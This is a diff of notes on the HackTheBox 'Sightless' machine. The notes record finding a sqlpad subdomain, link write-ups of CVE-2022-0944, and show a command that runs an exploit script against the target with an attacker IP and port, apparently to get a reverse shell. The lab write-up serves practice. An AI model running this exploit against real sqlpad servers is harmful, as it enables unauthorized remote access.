@@ -35,9 +35,13 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 ```
 
 checking http://sightless.htb
+
 fond http://sqlpad.sightless.htb/
+
 fond vulnerability in sqlpad - [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
-fond more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)
+
+found more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)
+
 exploit worked
 
 > python3 main.py http://sqlpad.sightless.htb/ 10.10.16.30 9999            
